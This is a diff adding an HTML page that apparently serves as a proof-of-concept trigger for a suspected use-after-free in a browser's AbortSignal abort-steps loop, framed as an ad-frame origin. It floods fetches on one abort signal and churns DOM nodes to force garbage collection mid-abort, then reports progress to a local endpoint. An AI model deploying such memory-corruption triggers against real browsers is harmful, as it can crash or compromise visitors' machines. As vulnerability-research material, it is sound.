@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<!-- Origin B (ad frame, :8802) — DOM-F1 trigger.
+     Target: AbortSignal::RunAbortSteps (abort_signal.cc:293-315)
+     abort_algorithms_ = HeapLinkedHashSet<WeakMember<AlgorithmHandle>>; fetch loaders
+     register algorithms (fetch_manager.cc:387) and NEVER remove them. Completed loaders
+     become Oilpan garbage while their handles sit weakly in the set. If the GC that
+     processes those weak refs fires while the RunAbortSteps loop is mid-iteration,
+     nodes unlink under the iterator -> CHECK(handle) tripwire / UAF walk
+     (upstream hunting as crbug.com/40068730). -->
+<html>
+<head><title>ad</title></head>
+<body>
+<div id="status">boot</div>
+<script>
+const statusEl = document.getElementById('status');
+let rounds = 0, totalFetches = 0, collected = 0;
+
+// telemetry: confirm dead owners actually get collected across rounds
+const finreg = new FinalizationRegistry(() => { collected++; });
+
+function report(msg) {
+  statusEl.textContent = msg;
+  console.log('DOMF1 ' + msg);
+  navigator.sendBeacon('/api/report?' + encodeURIComponent(msg));
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+let rndState = 1234;
+function rnd() { rndState = (rndState * 1103515245 + 12345) & 0x7fffffff; return rndState / 0x7fffffff; }
+
+// Oilpan-pressure: DOM nodes are Oilpan-collected, unlike ArrayBuffers (V8 heap).
+function churnDOM(n) {
+  for (let i = 0; i < n; i++) { const d = document.createElement('div'); d.className = 'x' + i; }
+}
+
+async function round() {
+  const c = new AbortController();
+  const sig = c.signal;
+  // "multi-listener": extra abort listeners (dispatched after the algorithm loop)
+  for (let i = 0; i < 5; i++) sig.addEventListener('abort', () => { churnDOM(50); });
+
+  const nData = 2000 + Math.floor(rnd() * 4000);      // instant-settle data: fetches
+  const nHttp = 30 + Math.floor(rnd() * 60);          // network loaders
+  const nTask = 10 + Math.floor(rnd() * 20);          // scheduler.postTask continuations
+
+  const settle = [];
+  for (let i = 0; i < nData; i++) {
+    const p = fetch('data:text/plain;base64,' + btoa('payload-' + rounds + '-' + i).slice(0, 64), { signal: sig })
+      .then(r => { finreg.register(r, i); }, () => {});
+    settle.push(p);
+  }
+  for (let i = 0; i < nHttp; i++) {
+    settle.push(fetch('/api/junk?r=' + rounds + '-' + i, { signal: sig }).then(() => {}, () => {}));
+  }
+  if (window.scheduler) {
+    for (let i = 0; i < nTask; i++) {
+      try { scheduler.postTask(() => { churnDOM(2); }, { signal: sig }); } catch (e) {}
+    }
+  }
+  await Promise.allSettled(settle);
+  await sleep(30 + Math.floor(rnd() * 40));  // macrotask: let microtask/promise refs drop
+
+  // bias Oilpan GC to fire DURING RunAbortSteps: fill right up to the edge, then abort
+  // synchronously in the same task (no awaits between churn and abort).
+  churnDOM(5000 + Math.floor(rnd() * 40000));
+  totalFetches += nData + nHttp;
+  c.abort();
+
+  rounds++;
+  if (rounds % 5 === 0) report('rounds=' + rounds + ' fetches=' + totalFetches + ' collected=' + collected);
+}
+
+(async () => {
+  report('started');
+  while (true) {
+    try { await round(); } catch (e) { report('error:' + e.message); await sleep(500); }
+    await sleep(50 + Math.floor(rnd() * 100));
+  }
+})();
+</script>
+</body>
+</html>
